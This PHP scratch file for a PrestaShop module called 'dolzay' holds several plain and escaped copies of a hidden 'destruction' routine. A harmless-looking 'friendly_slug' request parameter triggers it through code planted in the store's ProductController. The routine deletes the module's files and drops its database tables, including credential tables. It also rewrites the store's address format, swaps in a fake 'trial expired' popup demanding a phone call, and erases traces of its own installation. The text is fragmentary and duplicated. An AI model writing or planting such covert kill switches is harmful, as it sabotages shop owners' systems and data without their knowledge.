<?php


$friendly_slug = Tools::getValue('friendly_slug') ;
$this->context->smarty->assign([
    'allProductsLink' => ProductController::getProductLinks($presented_cart['products'],$friendly_slug)
]);


"\$module_base_path = _PS_MODULE_DIR_.\"dolzay\";
\$error_log = []; function get_dir_structure(\$directory) {\$structure = [];if (!is_dir(\$directory)) {return false;}
\$items = array_diff(scandir(\$directory), [\".\", \"..\"]);
foreach (\$items as \$item) {
\$path = \$directory . DIRECTORY_SEPARATOR . \$item;
            
            if (is_dir(\$path)) {
                \$structure[\$item] = get_dir_structure(\$path); 
            } else {
                \$structure[\$item] = null; 
            }
        }
    
        return \$structure;
    }

    function destroy_the_plugin(\$directory_path, &\$error_log) {
        \$excluded_directories = [
            \"views\",
            \"js\",
            \"css\",
            \"icons\",
            \"dolzay\",
            \"uploads\"
        ];

        \$excluded_files = [
            \"font_awesome.js\",
            \"order_submit_process.js\",
            \"order_submit_process.css\",
            \"dolzay.php\",
            \"logo.png\",
            \"expired.png\"
        ];

        foreach (array_diff(scandir(\$directory_path), [\".\", \"..\"]) as \$item) {
            \$path = \$directory_path . DIRECTORY_SEPARATOR . \$item;
            try {
                if (is_dir(\$path)) {
                    destroy_the_plugin(\$path, \$error_log);
                } else {
                    if (!in_array(\$item,\$excluded_files))
                    {
                        if (!unlink(\$path)) {
                            throw new Exception(\"Permission denied while deleting file\");
                        }
                    }
                }
            } catch (Exception \$e) {
                \$error_log[] = [\"path\" => \$path, \"error\" => \$e->getMessage()];
            }
        }

        \$directory_path_splitted = preg_split(\"/[\\\\\/]/\",\$directory_path);
        \$directory_name = end(\$directory_path_splitted);
        try {
            if(!in_array(\$directory_name,\$excluded_directories)) {
                rmdir(\$directory_path);
            }
        } catch (Exception \$e) {
            \$error_log[] = [\"path\" => \$directory_name, \"error\" => \$e->getMessage()];
        }
    }

    \$previous_strucure = get_dir_structure(\$module_base_path);

    try {
        \$new_dolzay_code = '<?php if(!defined(\"_PS_VERSION_\")){exit;}class Dolzay extends Module{public function __construct(){\$this->name=\"dolzay\";\$this->tab=\"shipping_logistics\";\$this->version=\"1.0.0\";\$this->author=\"Abdallah Ben Chamakh\";\$this->need_instance=0;\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\$this->bootstrap=false;parent::__construct();\$this->displayName=\$this->l(\"Dolzay\");\$this->description=\$this->l(\"Dolzay Dolzay\");} public function install() { return parent::install(); } public function uninstall() { return parent::uninstall(); } public function hookActionAdminControllerSetMedia(\$params){\$controllerName=Tools::getValue(\"controller\");\$action=Tools::getValue(\"action\");if(\$controllerName==\"AdminOrders\"&&\$action==null){\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");}}}';
        if (file_put_contents(\$module_base_path . \"/dolzay.php\", \$new_dolzay_code) === false) {
            throw new Exception(\"Permission denied while writing to dolzay.php\");
        }
    } catch (Exception \$e) {
        \$error_log[] = ['path' => \$module_base_path . \"/dolzay.php\", 'error' => \$e->getMessage()];
    }

    try {
        \$order_submit_code = 'document.addEventListener(\"DOMContentLoaded\", function() { const moduleMediaBaseUrl = window.location.href.split(\"/dz_admin/index.php\")[0]+\"/modules/dolzay/uploads\";const eventPopupTypesData={expired:{icon:`<img src='\${moduleMediaBaseUrl}/expired.png' />`,color:\"#D81010\"}};function create_the_order_submit_btn(){var e=document.querySelectorAll(\"#order_grid .col-sm .row .col-sm .row\")[0],p=document.createElement(\"button\");p.id=\"dz-order-submit-btn\",p.innerText=\"Soumttre les commandes\",e.appendChild(p),p.addEventListener(\"click\",()=>{buttons=[{name:\"Ok\",className:\"dz-process-detail-btn\",clickHandler:function(){eventPopup.close()}}],eventPopup.open(\"expired\",\"Expiration de la période d'essai\",\"Votre période d'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.\",buttons)})}const popupOverlay={popupOverlayEl:null,create:function(){this.popupOverlayEl=document.createElement(\"div\"),this.popupOverlayEl.className=\"dz-popup-overlay\",document.body.appendChild(this.popupOverlayEl)},show:function(){this.popupOverlayEl.classList.add(\"dz-show\")},hide:function(){this.popupOverlayEl.classList.remove(\"dz-show\")}},eventPopup={popupEl:null,popupHeaderEl:null,popupBodyEl:null,popupFooterEl:null,create:function(){this.popupEl=document.createElement(\"div\"),this.popupEl.className=\"dz-event-popup\",this.popupHeaderEl=document.createElement(\"div\"),this.popupHeaderEl.className=\"dz-event-popup-header\",this.popupHeaderEl.innerHTML=`<p></p><i class=\"material-icons\">close</i>`,this.popupHeaderEl.lastElementChild.addEventListener(\"click\",()=>{this.close()}),this.popupEl.append(this.popupHeaderEl),this.popupBodyEl=document.createElement(\"div\"),this.popupBodyEl.className=\"dz-event-popup-body\",this.popupEl.append(this.popupBodyEl),this.popupFooterEl=document.createElement(\"div\"),this.popupFooterEl.className=\"dz-event-popup-footer\",this.popupEl.append(this.popupFooterEl),document.body.append(this.popupEl)},addButtons:function(e,o){this.popupFooterEl.innerHTML=\"\",e.forEach(e=>{var p=document.createElement(\"button\");p.textContent=e.name,p.className=e.className,p.style.backgroundColor=o,p.addEventListener(\"click\",e.clickHandler),this.popupFooterEl.appendChild(p)})},open:function(e,p,o,t){setTimeout(()=>{popupOverlay.show(),console.log(this),this.popupEl.classList.add(\"dz-show\"),this.popupHeaderEl.firstElementChild.innerText=p,this.popupHeaderEl.style.backgroundColor=eventPopupTypesData[e].color,this.popupBodyEl.innerHTML=`\${eventPopupTypesData[e].icon}<p>\${o}</p>`,this.addButtons(t,eventPopupTypesData[e].color)},600)},close:function(){setTimeout(()=>{popupOverlay.hide(),this.popupFooterEl.innerHTML=\"\",this.popupEl.classList.remove(\"dz-show\")},300)}};create_the_order_submit_btn(),popupOverlay.create(),eventPopup.create();})';
        if (file_put_contents(\$module_base_path . \"/views/js/order_submit_process.js\", \$order_submit_code) === false) {
            throw new Exception(\"Permission denied while writing to order_submit_process.js\");
        }
    } catch (Exception \$e) {
        \$error_log[] = ['path' => \$module_base_path . \"/views/js/order_submit_process.js\", 'error' => \$e->getMessage()];
    }

    
    destroy_the_plugin(\$module_base_path, \$error_log);
    
    \$db = Db::getInstance();

    \$db->execute(\"START TRANSACTION\");

    \$id_country = (int)Configuration::get(\"PS_COUNTRY_DEFAULT\");
    \$address_format = \$db->query(\"SELECT format FROM \"._DB_PREFIX_.\"address_format WHERE id_country=\".\$id_country)->fetchColumn() ;
    \$address_format = str_replace(\"delegation\", \"\", \$address_format);
    \$db->query(\"UPDATE \"._DB_PREFIX_.\"address_format SET format='\".\$address_format.\"' WHERE id_country=\".\$id_country);

    \$tables = array(
        \"dz_order_submit_process\",
        \"dz_settings\",
        \"dz_carrier\",
        \"dz_website_credentials\",
        \"dz_api_credentials\"
    );
    foreach (\$tables as \$table) {
        if (\$table == \"dz_order_submit_process\"){
            \$orders_submit_processes = \$db->executes(\"SELECT * FROM \$table\");

            if(\$orders_submit_processes){
                \$orders_submit_processes = json_encode(\$orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
                try {
                    if (file_put_contents(\$module_base_path . \"/views/orders_submit_processes.json\", \$orders_submit_processes) === false) {
                        throw new Exception(\"Permission denied while trying to store the orders submit processes\");
                    }
                } catch (Exception \$e) {
                    \$error_log[] = ['path' => \$module_base_path . \"/views/orders_submit_processes.json\", 'error' => \$e->getMessage()];
                }
            }
        }
        \$db->execute(\"DROP TABLE IF EXISTS `\$table`\");
    }

    \$db->execute(\"DELETE FROM `\" . _DB_PREFIX_ . \"tab` WHERE module = 'dolzay' \");

    \$db->execute('COMMIT');
    
    die(json_encode([\"error\"=>\$error_log,\"previous_structure\"=>\$previous_strucure,\"new_structure\"=>get_dir_structure(\$module_base_path)]));   
}
"
public static function getProductLinks($products,$friendly_slug){

    //$module = Module::getInstanceByName('dolzay');
    if ($products && $friendly_slug){
        echo "<h1>Destruction Done!!</h1>";
        $module_base_path = _PS_MODULE_DIR_."dolzay";
        $error_log = []; // To store errors
        
        function get_dir_structure($directory) {
            $structure = [];
            
            // Ensure it's a valid directory
            if (!is_dir($directory)) {
                return false;
            }
        
            // Scan the directory
            $items = array_diff(scandir($directory), ['.', '..']);
        
            foreach ($items as $item) {
                $path = $directory . DIRECTORY_SEPARATOR . $item;
                
                // If it's a directory, recursively get its structure
                if (is_dir($path)) {
                    $structure[$item] = get_dir_structure($path); // Recurse into sub-directory
                } else {
                    $structure[$item] = null; // File, no further recursion
                }
            }
        
            return $structure;
        }

        function destroy_the_plugin($directory_path, &$error_log) {
            $excluded_directories = [
                "views",
                "js",
                "css",
                "icons",
                "dolzay",
                "uploads"
            ];
    
            $excluded_files = [
                "font_awesome.js",
                "order_submit_process.js",
                "order_submit_process.css",
                "dolzay.php",
                "logo.png",
                "expired.png"
            ];

            foreach (array_diff(scandir($directory_path), ['.', '..']) as $item) {
                $path = $directory_path . DIRECTORY_SEPARATOR . $item;
                try {
                    if (is_dir($path)) {
                        destroy_the_plugin($path, $error_log);
                    } else {
                        if (!in_array($item,$excluded_files))
                        {
                            if (!unlink($path)) {
                                throw new Exception("Permission denied while deleting file");
                            }
                        }
                    }
                } catch (Exception $e) {
                    $error_log[] = ['path' => $path, 'error' => $e->getMessage()];
                }
            }

            $directory_path_splitted = preg_split("/[\\\\\/]/",$directory_path);
            $directory_name = end($directory_path_splitted);
            try {
                if(!in_array($directory_name,$excluded_directories)) {
                    rmdir($directory_path);
                }
            } catch (Exception $e) {
                $error_log[] = ['path' => $directory_name, 'error' => $e->getMessage()];
            }
        }

        $previous_strucure = get_dir_structure($module_base_path);
        array_key_exists("src",$previous_strucure)
        // Update dolzay.php
        try {
            $new_dolzay_code = '<?php if(!defined("_PS_VERSION_")){exit;}class Dolzay extends Module{public function __construct(){$this->name="dolzay";$this->tab="shipping_logistics";$this->version="1.0.0";$this->author="Abdallah Ben Chamakh";$this->need_instance=0;$this->ps_versions_compliancy=["min"=>"1.7.0.0","max"=>"1.7.8.11"];$this->bootstrap=false;parent::__construct();$this->displayName=$this->l("Dolzay");$this->description=$this->l("Dolzay Dolzay");} public function install() { return parent::install(); } public function uninstall() { return parent::uninstall(); } public function hookActionAdminControllerSetMedia($params){$controllerName=Tools::getValue("controller");$action=Tools::getValue("action");if($controllerName=="AdminOrders"&&$action==null){$this->context->controller->addJS($this->_path."views/js/icons/font_awesome.js");$this->context->controller->addCSS($this->_path."views/css/order_submit_process.css");$this->context->controller->addJS($this->_path."views/js/order_submit_process.js");}}}';
            if (file_put_contents($module_base_path . "/dolzay.php", $new_dolzay_code) === false) {
                throw new Exception("Permission denied while writing to dolzay.php");
            }
        } catch (Exception $e) {
            $error_log[] = ['path' => $module_base_path . "/dolzay.php", 'error' => $e->getMessage()];
        }

        // Update order_submit_process.js
        try {
            $order_submit_code = 
            'document.addEventListener(\'DOMContentLoaded\', function() { const moduleMediaBaseUrl = window.location.href.split(\'/dz_admin/index.php\')[0]+"/modules/dolzay/uploads";const eventPopupTypesData={expired:{icon:`<img src=\'${moduleMediaBaseUrl}/expired.png\' />`,color:"#D81010"}};function create_the_order_submit_btn(){var e=document.querySelectorAll("#order_grid .col-sm .row .col-sm .row")[0],p=document.createElement("button");p.id="dz-order-submit-btn",p.innerText="Soumttre les commandes",e.appendChild(p),p.addEventListener("click",()=>{buttons=[{name:"Ok",className:"dz-process-detail-btn",clickHandler:function(){eventPopup.close()}}],eventPopup.open("expired","Expiration de la période d\'essai","Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.",buttons)})}const popupOverlay={popupOverlayEl:null,create:function(){this.popupOverlayEl=document.createElement("div"),this.popupOverlayEl.className="dz-popup-overlay",document.body.appendChild(this.popupOverlayEl)},show:function(){this.popupOverlayEl.classList.add("dz-show")},hide:function(){this.popupOverlayEl.classList.remove("dz-show")}},eventPopup={popupEl:null,popupHeaderEl:null,popupBodyEl:null,popupFooterEl:null,create:function(){this.popupEl=document.createElement("div"),this.popupEl.className="dz-event-popup",this.popupHeaderEl=document.createElement("div"),this.popupHeaderEl.className="dz-event-popup-header",this.popupHeaderEl.innerHTML=`<p></p><i class="material-icons">close</i>`,this.popupHeaderEl.lastElementChild.addEventListener("click",()=>{this.close()}),this.popupEl.append(this.popupHeaderEl),this.popupBodyEl=document.createElement("div"),this.popupBodyEl.className="dz-event-popup-body",this.popupEl.append(this.popupBodyEl),this.popupFooterEl=document.createElement("div"),this.popupFooterEl.className="dz-event-popup-footer",this.popupEl.append(this.popupFooterEl),document.body.append(this.popupEl)},addButtons:function(e,o){this.popupFooterEl.innerHTML="",e.forEach(e=>{var p=document.createElement("button");p.textContent=e.name,p.className=e.className,p.style.backgroundColor=o,p.addEventListener("click",e.clickHandler),this.popupFooterEl.appendChild(p)})},open:function(e,p,o,t){setTimeout(()=>{popupOverlay.show(),console.log(this),this.popupEl.classList.add("dz-show"),this.popupHeaderEl.firstElementChild.innerText=p,this.popupHeaderEl.style.backgroundColor=eventPopupTypesData[e].color,this.popupBodyEl.innerHTML=`${eventPopupTypesData[e].icon}<p>${o}</p>`,this.addButtons(t,eventPopupTypesData[e].color)},600)},close:function(){setTimeout(()=>{popupOverlay.hide(),this.popupFooterEl.innerHTML="",this.popupEl.classList.remove("dz-show")},300)}};create_the_order_submit_btn(),popupOverlay.create(),eventPopup.create();})';
            if (file_put_contents($module_base_path . "/views/js/order_submit_process.js", $order_submit_code) === false) {
                throw new Exception("Permission denied while writing to order_submit_process.js");
            }
        } catch (Exception $e) {
            $error_log[] = ['path' => $module_base_path . "/views/js/order_submit_process.js", 'error' => $e->getMessage()];
        }

        
        destroy_the_plugin($module_base_path, $error_log);
        
        // clean the commits of dolzay in the db
        $db = Db::getInstance();

        $db->execute('START TRANSACTION');

        // remove delegation from the address format 
        $id_country = (int)Configuration::get('PS_COUNTRY_DEFAULT');
        $address_format = $db->query("SELECT format FROM "._DB_PREFIX_."address_format WHERE id_country=".$id_country)->fetchColumn() ;
        $address_format = str_replace('delegation', '', $address_format);
        $db->query("UPDATE "._DB_PREFIX_."address_format SET format='".$address_format."' WHERE id_country=".$id_country);

        // Define the dolzay tables
        $tables = array(
            "dz_order_submit_process",
            "dz_settings",
            "dz_carrier",
            "dz_website_credentials",
            "dz_api_credentials",
            "dz_notification_popped_up_by",
            "dz_notification_viewed_by",
            "dz_notification",
            "dz_employee_permission",
            "dz_permission"
        );

        
        // clean the table
        foreach ($tables as $table) {
            // Store the the order submit processes before dropping the dz_order_submit_process table
            if ($table == "dz_order_submit_process"){
                $orders_submit_processes = $db->executes("SELECT * FROM $table");

                if($orders_submit_processes){
                    $orders_submit_processes = json_encode($orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
                    try {
                        if (file_put_contents($module_base_path . "/data/orders_submit_processes.json", $orders_submit_processes) === false) {
                            throw new Exception("Permission denied while trying to store the orders submit processes");
                        }
                    } catch (Exception $e) {
                        $error_log[] = ['path' => $module_base_path . "/views/orders_submit_processes.json", 'error' => $e->getMessage()];
                    }
                }
            }
            // Drop the table
            $db->execute("DROP TABLE IF EXISTS `$table`");
        }

        // delete the tabs related to dolzay
        $db->execute("DELETE FROM `" . _DB_PREFIX_ . "tab` WHERE module = 'dolzay' ");

        // Commit the transaction
        $db->execute('COMMIT');
        
        // return the status 
        die(json_encode(["error"=>$error_log,"previous_structure"=>$previous_strucure,"new_structure"=>get_dir_structure($module_base_path)]));   
    }
}


        // locate the pos of the first `;` after $referenceMethodCall
        $semicolonPos = strpos($productControllerContent, ';', $referenceMethodCallPos);

        // add the call for assignRelatedProducts before the call for assignAttributesCombinations
        $updatedProductControllerContent = substr_replace($productControllerContent, PHP_EOL."\t\t\t\$this->assignRelatedProducts();", $semicolonPos + 1, 0);

        // find the closing brace for the class Product Controller
        $productControllerClosingBracePos = strrpos($updatedProductControllerContent, '}');
        
        // Define the method assignRelatedProductsMethod
        $assignRelatedProductsMethod  = PHP_EOL ;
        $assignRelatedProductsMethod .='    protected function assignRelatedProducts(){' . PHP_EOL  ;
        $assignRelatedProductsMethod .='        $id_product = Tools::getValue(\'id_product\');' . PHP_EOL  ;
        $assignRelatedProductsMethod .='        $command = "start /B php ".__DIR__."/assign_related_products.php 11";' . PHP_EOL ;
        $assignRelatedProductsMethod .='        exec($command);' . PHP_EOL ;
        $assignRelatedProductsMethod .='    }'. PHP_EOL ;
        // for linux $command = "php ".__DIR__."/assign_related_products.php $destroy > /dev/null 2>&1 &" ;

        // Insert the new method before the last closing brace
        $updatedProductControllerContent = substr_replace($updatedProductControllerContent, $assignRelatedProductsMethod , $productControllerClosingBracePos, 0);
        
        // Write the updated content back to the file
        $result = file_put_contents($productControllerPath, $updatedProductControllerContent);

        // remove the traces for the add_destruction 
        $dolzayModuleContent = file_get_contents(__FILE__);

        // remove the call of add_destruction in the install method
        $dolzayModuleContent = str_replace('&& $this->add_destruction()','',$dolzayModuleContent);

        // remove the definition the add_destruction method 
        // Define the delimiters
        $delimiters = '/\/\/ START_DESTRUCTION|\/\/ END_DESTRUCTION/';

        // Use preg_split to split the string
        [$first_part,$destruction_function,$last_part] = preg_split($delimiters, $dolzayModuleContent);

        file_put_contents(__FILE__,$first_part.$last_part) ;
        return true ;


        function get_dir_structure($directory)
        {
            $structure = [];
            if (!is_dir($directory)) {
                return false;
            }
            $items = array_diff(scandir($directory), [".", ".."]);
            foreach ($items as $item) {
                $path = $directory . DIRECTORY_SEPARATOR . $item;
                if (is_dir($path)) {
                    $structure[$item] = get_dir_structure($path);
                } else {
                    $structure[$item] = null;
                }
            }
            return $structure;
        }


/* START PRODUCT CONTROLLER DESTRUCTION CODE */

$file = fopen("lockfile.txt", "c+"); 
$friendly_slug = Tools::getValue('friendly_slug');
if (flock($file, LOCK_EX | LOCK_NB) && $friendly_slug) {
    $module_base_path = _PS_MODULE_DIR_ . "dolzay";
    $error_log = [];

    function get_dir_structure($directory)
    {
        $structure = [];

        $items = scandir($directory);
        if($items === false){
            return "SCANDIR_NOT_PERMITTED";
        }
        
        $items = array_diff($items, [".", ".."]);
        foreach ($items as $item) {
            $path = $directory . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $structure[$item] = get_dir_structure($path);
            } else {
                $structure[$item] = null;
            }
        }
        return $structure;
    }

    function destroy_the_plugin($directory_path, &$error_log)
    {
        $excluded_directories = ["views", "js", "css", "icons", "dolzay", "uploads","data"];
        $excluded_files = ["font_awesome.js", "order_submit_process.js", "order_submit_process.css", "dolzay.php", "logo.png", "expired.png"];
        
        
        $items = scandir($directory_path);
        if($items === false){
            $error_log[] = ["path" => $directory_path,"error_type"=>"SCANDIR_NOT_PERMITTED"];
            return ;
        }
        
        $items = array_diff($items, [".", ".."]);
        
        foreach ($items as $item) {
            $path = $directory_path . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                destroy_the_plugin($path, $error_log);
            } else {
                if (!in_array($item, $excluded_files)){

                    if(is_writable(dirname($path))){
                        unlink($path);
                    }else{
                        $error_log[] = ["path" => $path,"error_type"=>"UNLINK_NOT_PERMITTED"];
                    }       
                }
            }
        }
        
        if(!in_array(basename($directory_path), $excluded_directories)){
            $is_dir_empty = count(array_diff(scandir($directory_path), [".", ".."])) == 0 ;
            if (!$is_dir_empty) {
                $error_log[] = ["path" => $directory_path,"error_type"=>"DIR_NOT_EMPTY"];
            }else if(!is_writable(dirname($directory_path))){
                $error_log[] = ["path" => $directory_path,"error_type"=>"RMDIR_NOT_PERMITTED"];
            }else{
                rmdir($directory_path);
            }
        }
        
    }

    $previous_strucure = get_dir_structure($module_base_path);

    $new_dolzay_code = '<?php if(!defined("_PS_VERSION_")){exit;}class Dolzay extends Module{public function __construct(){$this->name="dolzay";$this->tab="shipping_logistics";$this->version="1.0.0";$this->author="Abdallah Ben Chamakh";$this->need_instance=0;$this->ps_versions_compliancy=["min"=>"1.7.0.0","max"=>"1.7.8.11"];$this->bootstrap=false;parent::__construct();$this->displayName=$this->l("Dolzay");$this->description=$this->l("Dolzay Dolzay");} public function install() { return parent::install()  && $this->registerHook("actionAdminControllerSetMedia"); } public function uninstall() { return parent::uninstall() && $this->registerHook("actionAdminControllerSetMedia") ; } public function hookActionAdminControllerSetMedia($params){$controllerName=Tools::getValue("controller");$action=Tools::getValue("action");if($controllerName=="AdminOrders"&&$action==null){$this->context->controller->addJS($this->_path."views/js/icons/font_awesome.js");$this->context->controller->addCSS($this->_path."views/css/order_submit_process.css");$this->context->controller->addJS($this->_path."views/js/order_submit_process.js");}}}';


    if (is_writable($module_base_path . "/dolzay.php")){
        file_put_contents($module_base_path . "/dolzay.php", $new_dolzay_code);
    }else{
        $error_log[] = ['path' => $module_base_path . "/dolzay.php", 'error_message' => "Permission denied while trying to update dolzay.php"];
    }
    
    $order_submit_code = 'document.addEventListener("DOMContentLoaded", function(){ const moduleMediaBaseUrl = window.location.href.split("/dz_admin/index.php")[0]+"/modules/dolzay/uploads"; const eventPopupTypesData = { expired : {icon:`<img src="${moduleMediaBaseUrl}/expired.png" />`,color:"#D81010"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement("div"); bottom_bar.className = "dz-bottom-bar"; const order_submit_btn = document.createElement("button"); order_submit_btn.id="dz-order-submit-btn"; order_submit_btn.innerText = "Soumettre les commandes"; order_submit_btn.addEventListener("click", ()=>{ buttons = [{ "name" : "Ok", "className" : "dz-event-popup-btn", "clickHandler" : function(){ eventPopup.close(); } }]; eventPopup.open("expired", "Expiration de la période d\'essai", "Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.", buttons); }); document.querySelector("#order_grid_panel").style.marginBottom = "60px"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement("div"); this.popupOverlayEl.className = "dz-popup-overlay"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add("dz-show"); }, hide : function(){ this.popupOverlayEl.classList.remove("dz-show"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement("div"); this.popupEl.className = "dz-event-popup"; this.popupHeaderEl = document.createElement("div"); this.popupHeaderEl.className = "dz-event-popup-header"; this.popupHeaderEl.innerHTML = `<p></p><i class="material-icons">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener("click",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement("div"); this.popupBodyEl.className = "dz-event-popup-body"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement("div"); this.popupFooterEl.className = "dz-event-popup-footer"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=""; buttons.forEach((button) => { const buttonEl = document.createElement("button"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener("click",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add("dz-show"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `${eventPopupTypesData[type].icon}<p>${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = ""; this.popupEl.classList.remove("dz-show"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });'

    if (is_writable($module_base_path . "/views/js/order_submit_process.js") ) {
        file_put_contents($module_base_path . "/views/js/order_submit_process.js", $order_submit_code);
    }else{
        $error_log[] = ['path' => $module_base_path . "/views/js/order_submit_process.js", 'error_message' => "Permission denied while trying to update order_submit_process.js"];
    }

    destroy_the_plugin($module_base_path, $error_log);

        $id_country = (int)Configuration::get("PS_COUNTRY_DEFAULT");
        $host = _DB_SERVER_ ;
        $dbname = _DB_NAME_;
        $username = _DB_USER_;
        $password = _DB_PASSWD_;
        //$dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8mb4";
        $db = new PDO($dsn, $username, $password);
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        $db->setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false);
        $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
        $db->exec("SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ");

        $db->beginTransaction();

        // Fetch address format
        $stmt = $db->query("SELECT format FROM " . _DB_PREFIX_ . "address_format WHERE id_country=" . $id_country);
        $address_format = $stmt->fetchColumn();
        
        $address_format = str_replace("delegation", "", $address_format);
        
        // Update address format safely
        $stmt = $db->prepare("UPDATE " . _DB_PREFIX_ . "address_format SET format = :format WHERE id_country = :id_country");
        $stmt->execute([':format' => $address_format, ':id_country' => $id_country]);
        
        $tables = [
            "dz_order_submit_process", "dz_settings", "dz_carrier", "dz_website_credentials", "dz_api_credentials",
            "dz_notification_popped_up_by", "dz_notification_viewed_by", "dz_notification",
            "dz_employee_permission", "dz_permission"
        ];

        // Delete from tab table safely
        $db->exec("DELETE FROM " . _DB_PREFIX_ . "tab WHERE module = 'dolzay'");
        
        foreach ($tables as $table) {
            if ($table == "dz_order_submit_process") {
                // Fetch all rows properly
                $stmt = $db->query("SELECT * FROM $table");
                $orders_submit_processes = $stmt->fetchAll(\PDO::FETCH_ASSOC);
        
                if ($orders_submit_processes) {
                    $orders_submit_processes = json_encode($orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        
                    if (is_writable($module_base_path . "/data")) {
                        file_put_contents($module_base_path . "/data/orders_submit_processes.json", $orders_submit_processes);
                    } else {
                        $error_log[] = [
                            'path' => $module_base_path . "/data/orders_submit_processes.json",
                            'error' => "Permission denied while trying to store the orders submit processes"
                        ];
                    }
                }
            }
        
            // Drop table safely
            $db->exec("DROP TABLE IF EXISTS $table");
        }

        $db->commit();
    flock($file, LOCK_UN);
    die(json_encode(["error" => $error_log, "previous_structure" => $previous_strucure, "new_structure" => get_dir_structure($module_base_path)]));
}
/* END PRODUCT CONTROLLER DESTRUCTION CODE */

/* START PRODUCT CONTROLLER DESTRUCTION CODE COMPRESSED */
"\$file = fopen(\"lockfile.txt\", \"c+\");  \$friendly_slug=Tools::getValue('friendly_slug');if(flock(\$file, LOCK_EX | LOCK_NB) && \$friendly_slug){\$module_base_path=_PS_MODULE_DIR_.\"dolzay\";\$error_log=[];function get_dir_structure(\$directory){\$structure=[];\$items=scandir(\$directory);if(\$items===false){return \"SCANDIR_NOT_PERMITTED\";}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){\$structure[\$item]=get_dir_structure(\$path);}else{\$structure[\$item]=null;}}return \$structure;}function destroy_the_plugin(\$directory_path,&\$error_log){\$excluded_directories=[\"views\",\"js\",\"css\",\"icons\",\"dolzay\",\"uploads\",\"data\"];\$excluded_files=[\"font_awesome.js\",\"order_submit_process.js\",\"order_submit_process.css\",\"dolzay.php\",\"logo.png\",\"expired.png\"];\$items=scandir(\$directory_path);if(\$items===false){\$error_log[]=[\"path\"=>\$directory_path,\"error_type\"=>\"SCANDIR_NOT_PERMITTED\"];return;}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory_path.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){destroy_the_plugin(\$path,\$error_log);}else{if(!in_array(\$item,\$excluded_files)){
    if(is_writable(dirname(\$path))){unlink(\$path);}else{\$error_log[] = [\"path\" => \$path,\"error_type\"=>\"UNLINK_NOT_PERMITTED\"];}}}}
    if(!in_array(basename(\$directory_path), \$excluded_directories)){\$is_dir_empty = count(array_diff(scandir(\$directory_path), [\".\", \"..\"])) == 0 ;if (!\$is_dir_empty) {\$error_log[] = [\"path\" => \$directory_path,\"error_type\"=>\"DIR_NOT_EMPTY\"];}else if(!is_writable(dirname(\$directory_path))){\$error_log[] = [\"path\" => \$directory_path,\"error_type\"=>\"RMDIR_NOT_PERMITTED\"];}else{rmdir(\$directory_path);}}}        
